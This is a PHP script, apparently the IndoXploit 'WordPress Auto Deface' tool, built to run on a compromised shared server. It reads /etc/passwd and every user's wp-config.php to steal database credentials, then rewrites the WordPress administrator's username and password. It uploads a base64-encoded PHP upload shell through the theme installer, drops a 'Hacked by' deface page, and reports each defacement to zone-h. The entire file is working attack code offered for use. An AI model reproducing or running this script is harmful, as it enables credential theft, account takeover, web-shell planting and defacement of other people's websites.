<?php
//how to use : https://www.youtube.com/watch?v=q72Rp8QM4xI
//Tu5b0l3d
//IndoXploit
//http://indoxploit.blogspot.com/ - linuxsec.org
error_reporting(0);
$zh = "Nabilaholic404"; // zone-h nick
$jembut = "jack"; // add username wordpress
$jembut2 = "linuxsec"; // add password wordpress
$kontol = "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'>Hacked by LinuxSec<p style='color: transparent'><title>Hacked by Nabilaholic404</title>"; // script deface

######################################################################
// script di bawah tidak perlu di otak atik
// jangan pernah mengubah nama file ( k.php ) dan ( m.php ) , atau auto deface tidak akan berjalan
echo "<body bgcolor=black>";
echo "<font color=green>";
echo "<title>IndoXploit WordPress Auto Deface</title>";
cover("IndoXploit");

function save($data){
		$fp = @fopen("indo.htm", "a") or die("cant open file");
		fwrite($fp, $data);
		fclose($fp);
}

function anucurl($sites){
		$ch1 = curl_init ("$sites");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
$data = curl_exec ($ch1);
return $data;
	}

function lohgin($cek, $web, $userr, $pass){
		$post = array(
					"log" => "$userr",
					"pwd" => "$pass",
					"rememberme" => "forever",
					"wp-submit" => "Log In",
					"redirect_to" => "$web/wp-admin/",
					"testcookie" => "1",
					);
$ch = curl_init ("$cek");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data6 = curl_exec ($ch);
return $data6;
	}

function cover($indoXploit){
	echo "<center><font size='5px'> WordPress Auto Deface Coded by $indoXploit</font><br>"; 
	echo "Deface Result : <a href='indo.htm' style='text-decoration: none'>indo.htm</a></center><br><br><br>";
}

function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}


$a = file_get_contents('/etc/passwd');
    preg_match_all('/(.*?):x:/', $a, $data);
    foreach($data[1] as $user){
$baca = file_get_contents("/home/$user/public_html/wp-config.php");
 
 /* symlink('/home/'.$user.'/public_html/wp-config.php',$user.'- config.txt');  */

if($baca!=""){
	

/* $b = `cp /home/$user/public_html/index.php $user-index.txt`; */

$file1 = "$user-config.txt";
$fp2 = fopen($file1,"w");
fputs($fp2,$baca);

$file = @file_get_contents($file1);


echo $user."-> sukses<br>";
					$host = ambilkata($file,"DB_HOST', '","'");
					$username = ambilkata($file,"DB_USER', '","'");
					$password = ambilkata($file,"DB_PASSWORD', '","'");
					$db = ambilkata($file,"DB_NAME', '","'");
					$dbprefix = ambilkata($file,"table_prefix  = '","'");
					$user_baru = $jembut;
					$password_baru = $jembut2;
					$prefix = $db.".".$dbprefix."users";
					$sue = $db.".".$dbprefix."options";
					$pass = md5("$password_baru");
					$nick = $kontol;

echo "# Db Host: $host<br>";
echo "# Db user: $username<br>";
echo "# Db Password: $password<br>";
echo "# Db name: $db<br>";
echo "# Table_Prefix: $dbprefix<br>";

mysql_connect($host,$username,$password);

        mysql_select_db($db);

		$tampil=mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
   		$r=mysql_fetch_array($tampil);
        $id = $r[ID];

        $tampil2=mysql_query("SELECT * FROM $sue ORDER BY option_id ASC");
   		$r2=mysql_fetch_array($tampil2);
        $target = $r2[option_value];
         echo "# $target<br>";
        

         mysql_query("UPDATE $prefix SET user_pass='$pass',user_login='$user_baru' WHERE ID='$id'");

$site= "$target/wp-login.php";
$site2= "$target/wp-admin/theme-install.php?upload";
$a = lohgin($site, $target, $user_baru, $password_baru);
$b = lohgin($site2, $target, $user_baru, $password_baru);
			

$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
echo "# token -> $anu2<br>";


$upload3 = base64_decode("PD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");

$www = "m.php";
$fp5 = fopen($www,"w");
fputs($fp5,$upload3);

$c = file_get_contents($w);
    
  $post2 = array(
					"_wpnonce" => "$anu2",
					"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
					"themezip" => "@m.php",
					"install-theme-submit" => "Install Now",
					);
$ch = curl_init ("$target/wp-admin/update.php?action=upload-theme");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);

$namafile = "wew.php";
$fp2 = fopen($namafile,"w");
fputs($fp2,$nick);

$y = date("Y");
$m = date("m");


$ch6 = curl_init("$target/wp-content/uploads/$y/$m/m.php");
curl_setopt($ch6, CURLOPT_POST, true);
curl_setopt($ch6, CURLOPT_POSTFIELDS,
array('file3'=>"@$namafile"));
curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch6, CURLOPT_COOKIEFILE, "coker_log");
$postResult = curl_exec($ch6);
curl_close($ch6);

$as = "$target/k.php";
$bs = file_get_contents($as);
 if(preg_match("#hacked#si",$bs)){
                        echo "[+] <font color='cyan'>Deface success..<br>";
                        echo "[+] $as<br>";
                        save($as."<br>");
                        echo "[+] zone-h: ";
						$ch3 = curl_init ("http://www.zone-h.com/notify/single");
						curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt ($ch3, CURLOPT_POST, 1);
						curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=$zh&domain1=$as&hackmode=1&reason=1");
						
        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch3))){
                echo  " Ok  <br><br>";
        }else{
                echo " No <br><br></font>";}
                    }
                    else{
                        echo "[!] <font color='red'>Deface Failed..<br>";
                        echo "[!] Try manual deface at : <br>";
                        echo "[!] $target/wp-login.php<br>";
                        echo "[!] username: $user_baru<br>";
                        echo "[!] password: $password_baru<br><br><br></font>";

                       
                    }
    }
else{
	echo "$user <= No<br>";
}



}


?>
